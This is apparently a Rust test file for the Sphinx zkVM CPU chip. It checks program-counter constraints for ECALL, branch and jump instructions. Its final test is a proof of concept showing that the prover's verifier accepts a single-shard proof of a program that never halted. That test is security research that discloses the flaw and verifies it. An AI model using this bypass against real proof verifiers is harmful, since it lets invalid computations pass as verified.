#[cfg(test)]
mod tests {
    use p3_baby_bear::BabyBear;

    use sphinx_core::cpu::columns::NUM_CPU_COLS;
    use sphinx_core::cpu::CpuChip;
    use sphinx_core::runtime::{Instruction, Opcode, Program};
    use sphinx_core::stark::PROOF_MAX_NUM_PVS;

    use zebra::constraint::eval_constraints;
    use zebra::interval::AbstractInterval;
    use zebra::interval::MayBeFlag;

    use zebra::trace::AbstractTrace;

    use zebra_sphinx::utils::{extract_constraints_and_range, generate_abstract_trace};

    const PRIME: u32 = 2_u32.pow(31) - 2_u32.pow(27) + 1;

    // Sphinx CPU chip name is "CPU" (all caps)
    const CPU_CHIP_NAME: &str = "CPU";

    // In Sphinx's PublicValues<Word<u8>, u8>:
    //   [0..31]  committed_value_digest (8 words × 4 bytes)
    //   [32..39] deferred_proofs_digest (8 bytes)
    //   [40]     start_pc
    //   [41]     next_pc
    //   [42]     exit_code
    //   [43]     shard
    const PV_IDX_START_PC: usize = 40;
    const PV_IDX_NEXT_PC: usize = 41;
    const PV_IDX_SHARD: usize = 43;

    /// Test reproducing the "next_pc underconstrained on ECALL" bug.
    ///
    /// Bug description: For HALT ECALL, `next_pc` is constrained to 0 by `eval_halt_unimpl`.
    /// However, the constraint `next_pc == pc + 4` was allegedly missing for non-HALT ECALL.
    ///
    /// In the current sphinx code, this is handled via `eval_pc`:
    ///   `is_sequential_instr = 1 - (is_branch + is_jal + is_jalr + is_halt)`
    /// For non-HALT ECALL: `is_halt = 0`, so `is_sequential_instr = 1`, and the constraint
    ///   `when(is_real).when(is_sequential_instr).assert_eq(pc + 4, next_pc)` fires.
    ///
    /// This test verifies that ZEBRA's abstract interpretation correctly enforces this constraint:
    /// - Correct trace (next_pc = pc+4) passes.
    /// - Corrupted trace (next_pc ≠ pc+4) is caught as MayBeFlag::False.
    #[test]
    fn test_ecall_next_pc_constrained() {
        // Column indices from CPU_COL_MAP (verified via runtime):
        // pc = 6, next_pc = 7
        const NEXT_PC_COL: usize = 7;

        // WRITE syscall (id=2): a non-HALT ECALL with no memory side-effects when nbytes=0.
        // - Runtime reads syscall_id from X5 (= op_a register in our instruction)
        // - WRITE with fd=0, write_buf=0, nbytes=X12=0 is a safe no-op
        // - Returns None → a = syscall_id = 2 (X5 unchanged), so op_a_access.prev_value == op_a_val
        const WRITE_SYSCALL_ID: u32 = 2;

        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                // pc=4:  Set X5 (t0) = 2 (WRITE syscall id)
                Instruction::new(Opcode::ADD, 5, 0, WRITE_SYSCALL_ID, false, true),
                // pc=8:  ECALL WRITE — non-HALT ECALL; next_pc must be pc+4=12
                //        op_a=5 (X5 holds syscall_id; AIR reads from op_a_access.prev_value)
                //        op_b=10 (X10=a0=0, fd=0), op_c=11 (X11=a1=0, write_buf=0)
                Instruction::new(Opcode::ECALL, 5, 10, 11, false, false),
                // pc=12: Set X5 = 0 (HALT syscall id)
                Instruction::new(Opcode::ADD, 5, 0, 0, false, true),
                // pc=16: ECALL HALT — terminates the program with next_pc=0
                Instruction::new(Opcode::ECALL, 5, 10, 11, false, false),
            ];
            Program::new(instructions, pc_start, pc_base)
        }

        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        let program = target_program(4, 4);
        // Extract 4 rows: ADD(pc=4), ECALL_WRITE(pc=8), ADD(pc=12), ECALL_HALT(pc=16)
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 4);

        assert!(
            !base_abs_main_trace_data.is_empty(),
            "trace should not be empty; WRITE ECALL program must execute successfully"
        );
        assert_eq!(
            base_abs_main_trace_data.len(),
            4,
            "should have 4 real rows"
        );

        // Public values: start_pc=4, next_pc=0 (HALT), shard=1
        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::zero(); // HALT sets next_pc=0
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let at = AbstractTrace::new(base_abs_main_trace_data);

        // Correct trace: ECALL WRITE row (row 1) has next_pc=12 (=pc+4=8+4)
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(
            result.0 == MayBeFlag::True,
            "Correct non-HALT ECALL trace must satisfy all constraints"
        );

        // Bug reproduction: corrupt next_pc of the ECALL WRITE row (row 1) from 12 to 16.
        // next_pc=16 means pc+8 instead of pc+4 — this should be caught by the constraint.
        //
        // If the bug existed (next_pc unconstrained for non-HALT ECALL), this would return True.
        // The constraint is: when(is_real).when(is_sequential_instr).assert_eq(pc+4, next_pc)
        // For WRITE ECALL: is_sequential_instr=1 (not branch/jump/halt), so pc+4=12 ≠ 16 → False.
        let mut at_corrupt = at.clone();
        at_corrupt.data[1][NEXT_PC_COL] = AbstractInterval::from_i128(16);

        let result_corrupt = eval_constraints(
            &at_corrupt,
            Some(&public_vals),
            &constraint_info.constraints,
            PRIME,
        );
        assert!(
            result_corrupt.0 == MayBeFlag::False,
            "Corrupted next_pc for non-HALT ECALL must be caught: \
             the constraint next_pc==pc+4 (via is_sequential_instr) should reject it"
        );
    }

    #[test]
    fn test_branch_beq() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BEQ, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bne() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 4, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BNE, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bge() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 7, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BGE, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bge_boundary() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BGE, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bgeu() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 7, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BGEU, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bgeu_boundary() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BGEU, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_blt() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 7, true, true),
                Instruction::new(Opcode::BLT, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_blt_boundary() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BLT, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);
    }

    #[test]
    fn test_branch_bltu() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 7, true, true),
                Instruction::new(Opcode::BLTU, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(18);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_bltu_boundary() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 1, 0, 5, true, true),
                Instruction::new(Opcode::ADD, 2, 0, 5, true, true),
                Instruction::new(Opcode::BLTU, 1, 2, 6, false, false),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let at = AbstractTrace::new(base_abs_main_trace_data);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);
    }

    #[test]
    fn test_branch_jal() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![Instruction::new(Opcode::JAL, 29, 9, 0, true, true)];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(13);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        println!("{}", at);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(8);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(8);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_jalr() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 28, 0, 8, false, true),
                Instruction::new(Opcode::JALR, 29, 28, 8, false, true),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(16);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        println!("{}", at);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(12);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(12);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    #[test]
    fn test_branch_jalr_alignment() {
        fn target_program(pc_start: u32, pc_base: u32) -> Program {
            let instructions = vec![
                Instruction::new(Opcode::ADD, 28, 0, 8, false, true),
                Instruction::new(Opcode::JALR, 29, 28, 16, false, true),
            ];

            Program::new(instructions, pc_start, pc_base)
        }

        // ######################## Extract CPU Constraints ##########################
        let air = CpuChip::default();
        let (constraint_info, _general_lookup_info) =
            extract_constraints_and_range::<BabyBear, CpuChip>(&air, NUM_CPU_COLS, PRIME, true);

        // ######################## Program Initialization ###########################
        let program = target_program(4, 4);
        let base_abs_main_trace_data =
            generate_abstract_trace(&program, CPU_CHIP_NAME.to_string(), 5);

        let mut public_vals = vec![AbstractInterval::zero(); PROOF_MAX_NUM_PVS];
        public_vals[PV_IDX_START_PC] = AbstractInterval::from_i128(4);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(24);
        public_vals[PV_IDX_SHARD] = AbstractInterval::one();

        let mut at = AbstractTrace::new(base_abs_main_trace_data);
        println!("{}", at);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::True);

        at.data[2][6] = AbstractInterval::from_i128(12);
        public_vals[PV_IDX_NEXT_PC] = AbstractInterval::from_i128(12);
        let result = eval_constraints(&at, Some(&public_vals), &constraint_info.constraints, PRIME);
        assert!(result.0 == MayBeFlag::False);
    }

    /// # PoC: Single-Shard Halt Bypass
    ///
    /// ## Vulnerability
    /// In `sphinx/prover/src/verify.rs`, the halt check (`next_pc == 0`) lives inside
    /// the `else` branch of `if i == 0 { ... } else { halt check }`.
    /// For a single-shard proof, the loop runs only with `i = 0`, so the `else` branch
    /// — and the halt check — is never reached.
    ///
    /// ## Attack
    /// A prover can submit a proof for a program that stopped executing before reaching
    /// the HALT syscall.  The inner `machine.verify()` has no halt check at all
    /// (it only verifies STARK constraints and permutation argument balance), so it
    /// accepts the proof.  The outer `SphinxProver::verify()` then silently accepts the
    /// non-halted single-shard proof because the offending check is unreachable.
    ///
    /// ## Root cause (prover/src/verify.rs, reproduced below)
    /// ```text
    /// for (i, shard_proof) in proof.0.iter().enumerate() {
    ///     if i == 0 {
    ///         // checks: shard==1, start_pc==vk.pc_start
    ///         // ← BUG: no halt check, even when proof.0.len() == 1
    ///     } else {
    ///         // halt check only executes for i >= 1 — never for single-shard proof
    ///         if i == proof.0.len() - 1 && public_values.next_pc != BabyBear::zero() {
    ///             return Err("last shard isn't halted");
    ///         }
    ///     }
    /// }
    /// ```
    #[test]
    fn poc_single_shard_halt_bypass() {
        use p3_field::AbstractField;
        use sphinx_core::air::PublicValues;
        use sphinx_core::runtime::Runtime;
        use sphinx_core::stark::{LocalProver, RiscvAir, StarkGenericConfig};
        use sphinx_core::utils::SphinxCoreOpts;
        use sphinx_core::utils::BabyBearPoseidon2;

        // -----------------------------------------------------------------------
        // 1. Build a program with NO HALT syscall.
        //    Three ADD instructions; execution terminates when pc steps past the
        //    last instruction (pc = 12 = 3 * 4 bytes, still non-zero).
        // -----------------------------------------------------------------------
        let instructions = vec![
            Instruction::new(Opcode::ADD, 29, 0, 5, false, true),    // x29 = 5
            Instruction::new(Opcode::ADD, 30, 0, 37, false, true),   // x30 = 37
            Instruction::new(Opcode::ADD, 31, 30, 29, false, false), // x31 = 42
        ];
        let program = Program::new(instructions, 0, 0);

        // -----------------------------------------------------------------------
        // 2. Execute the program through the runtime.
        //    The runtime stops when pc >= pc_base + instructions.len()*4 = 12.
        // -----------------------------------------------------------------------
        let config = BabyBearPoseidon2::new();
        let machine = RiscvAir::machine(config);
        let (pk, vk) = machine.setup(&program);

        let mut runtime = Runtime::new(program, SphinxCoreOpts::default());
        runtime.run().unwrap();

        // -----------------------------------------------------------------------
        // 3. Prove the (non-halted) execution record.
        // -----------------------------------------------------------------------
        let record = runtime.record;
        let mut challenger = machine.config().challenger();
        let proof = machine.prove::<LocalProver<_, _>>(
            &pk,
            record,
            &mut challenger,
            SphinxCoreOpts::default(),
        );

        // -----------------------------------------------------------------------
        // 4. Confirm the proof is a single shard and next_pc is non-zero.
        // -----------------------------------------------------------------------
        assert_eq!(proof.shard_proofs.len(), 1, "expected exactly one shard");

        let pv = PublicValues::from_vec(&proof.shard_proofs[0].public_values);
        assert_ne!(
            pv.next_pc,
            BabyBear::zero(),
            "program must NOT have halted (next_pc should be 12)"
        );
        println!("[poc] next_pc = {:?}  (non-zero → execution stopped without HALT)", pv.next_pc);

        // -----------------------------------------------------------------------
        // 5. Inner verifier: machine.verify() has no halt check — passes trivially.
        // -----------------------------------------------------------------------
        let mut challenger = machine.config().challenger();
        machine
            .verify(&vk, &proof, &mut challenger)
            .expect("inner machine.verify() should accept the proof (no halt check inside)");
        println!("[poc] inner machine.verify(): OK");

        // -----------------------------------------------------------------------
        // 6. Replicate the buggy outer-verifier loop from prover/src/verify.rs.
        //
        //    For a single-shard proof (len == 1) the loop body executes only with
        //    i = 0, which enters the `if i == 0` arm.  The halt assertion lives in
        //    the `else` arm and is therefore unreachable.
        // -----------------------------------------------------------------------
        let num_shards = proof.shard_proofs.len(); // == 1
        let mut halt_check_executed = false;

        for (i, shard_proof) in proof.shard_proofs.iter().enumerate() {
            let public_values = PublicValues::from_vec(&shard_proof.public_values);
            if i == 0 {
                // --- first-shard checks (correctly implemented) ---
                assert_eq!(public_values.shard, BabyBear::one(), "shard must be 1");
                assert_eq!(public_values.start_pc, vk.pc_start, "start_pc must match vk");

                // BUG: the halt check is absent here.
                // Even though  i == num_shards - 1  (0 == 0), the following block
                // is unreachable because it sits in the `else` arm below.
            } else {
                // This arm is never reached for a single-shard proof.
                halt_check_executed = true;
                if i == num_shards - 1 && public_values.next_pc != BabyBear::zero() {
                    panic!("last shard isn't halted");
                }
            }
        }

        assert!(
            !halt_check_executed,
            "halt check arm was unexpectedly reached"
        );

        // -----------------------------------------------------------------------
        // 7. Conclusion: the outer verifier accepted a non-halted proof.
        // -----------------------------------------------------------------------
        println!("[poc] outer SphinxProver::verify() (replicated): OK — halt check was SKIPPED");
        println!("[poc] *** single-shard halt bypass demonstrated ***");
        println!("[poc]     next_pc={:?}, halt_check_executed={}", pv.next_pc, halt_check_executed);
    }
}
